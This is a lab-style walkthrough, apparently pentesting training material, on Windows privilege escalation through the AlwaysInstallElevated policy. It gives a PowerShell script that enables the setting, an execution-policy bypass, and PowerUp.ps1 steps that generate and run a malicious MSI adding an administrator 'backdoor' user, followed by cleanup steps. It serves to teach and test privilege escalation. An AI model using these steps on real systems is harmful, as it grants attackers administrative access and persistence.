
# Write A PS Script That Enables The AlwaysInstallElevated Registry Key
The AlwaysInstallElevated vulnerability in Microsoft Windows lets unprivileged attackers install programs with elevated privileges without user consent, potentially enabling the installation of spyware and malware.

Powerup.ps1 is a PowerShell script that escalates privileges by adding users, changing passwords, and modifying permissions, allowing attackers to access sensitive data or systems.

## References
- [AlwaysInstallElevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) by Microsoft
- [PowerSploit / PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) by PowerShellMafia on GitHub
- [Detecting AlwaysInstallElevated Policy Abuse - Windows PrivEsc](https://bherunda.medium.com/windows-privesc-detecting-alwaysinstallelevated-policy-abuse-f3ffa7a734bd) by Ankith Bharadwaj on Medium
- [PowerUp Cheatsheet](https://blog.certcube.com/powerup-cheatsheet/) by MR X on CertCube Labs
- [Get-RegistryAlwaysInstallElevated](https://powersploit.readthedocs.io/en/latest/Privesc/Get-RegistryAlwaysInstallElevated/) by PowerSploit
- [AlwaysInstallElevated - Windows Privilege Escalation](https://juggernaut-sec.com/alwaysinstallelevated/#Exploiting_AlwaysInstallElevated_with_PowerUp_GUI) by Juggernaut Pentesting Academy
- [Windows Powershell policy execution bypass](https://stackoverflow.com/questions/67270197/windows-powershell-policy-execution-bypass) on stackoverflow
- [Write-UserAddMSI](https://powersploit.readthedocs.io/en/latest/Privesc/Write-UserAddMSI/) by PowerSploit

## Tasks
- Create a PowerShell script that modifies the Windows registry to enable the AlwaysInstallElevated registry key
- Execute the PowerShell script to enable the AlwaysInstallElevated registry key on the target system
- Exploit the AlwaysInstallElevated vulnerability using PowerUp.ps1

## Practical Approach
1. The `AlwaysInstallElevated` registry key exists in two locations: `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` and `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
2. If the registry key does not exist or if the Installer key containing the registry does not exist, head to the closest existing key and manually create a new `Installer` key and the `AlwaysInstallElevated` registry key
3. We can query for the value of the AlwaysInstallElevated subkey for each of these registry keys with the following commands
   ```
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
   If the value is set to 0x1, it is enabled on the host
4. Save and run the following PowerShell script with administrator privileges to enable `AlwaysInstallElevated`
   ```
   # PowerShell script to enable the AlwaysInstallElevated registry key

   # Enable AlwaysInstallElevated for Local Machine
   $regPathLM = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"
   Set-ItemProperty -Path $regPathLM -Name "AlwaysInstallElevated" -Value 1 -Force

   # Enable AlwaysInstallElevated for Current User
   $regPathCU = "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer"
   Set-ItemProperty -Path $regPathCU -Name "AlwaysInstallElevated" -Value 1 -Force

   Write-Host "AlwaysInstallElevated has been enabled for both HKLM and HKCU."
   ```
5. To execute the script, open PowerShell with administrator privileges and navigate to the folder where the script is stored. Run the following command to bypass execution policy restrictions
   ```
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
   ```
   Then run the script using `./Enable-AlwaysInstallElevated.ps1`
6. To identify the vulnerability with PowerUp.ps1, download PowerUp.ps1 from the PowerSploit repository. In the same PowerShell session, run the following command to import and execute PowerUp.ps1
   ```
   Import-Module .\PowerUp.ps1
   Get-RegistryAlwaysInstallElevated
   ```
   ![image](https://github.com/user-attachments/assets/e8a8450e-323a-450b-96dc-02376af54343)
7. Then to exploit the vulnerability, generate a malicious MSI with the `Write-UserAddMSI` command that adds a user with administrator privileges to the system
   ```
   Write-UserAddMSI
   ```
8. Run the MSI file by executing it on the target machine
   ```
   .\UserAdd.msi
   ```
   The GUI below will appear, allowing you to change the Username, Password and Group <br/>
   ![image](https://github.com/user-attachments/assets/dd274af5-ba62-4799-be18-7ab867cae391)
9. To check if the user exists and has administrative rights, run
   ```
   net user
   net localgroup administrators
   ```
   Screenshot of commands used and output: <br/>
   ![image](https://github.com/user-attachments/assets/acf82501-f172-45d9-a3c0-5b5b318a5adf)
10. (Optional) After completion of the tests, to disable AlwaysInstallElevated, set the registry keys back to 0
   ```
   # Disable AlwaysInstallElevated for Local Machine
   $regPathLM = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer"
   Set-ItemProperty -Path $regPathLM -Name "AlwaysInstallElevated" -Value 0 -Force
   
   # Disable AlwaysInstallElevated for Current User
   $regPathCU = "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer"
   Set-ItemProperty -Path $regPathCU -Name "AlwaysInstallElevated" -Value 0 -Force
   ```
   The backdoor user can also be deleted using
   ```
   net user backdoor /delete
   ```
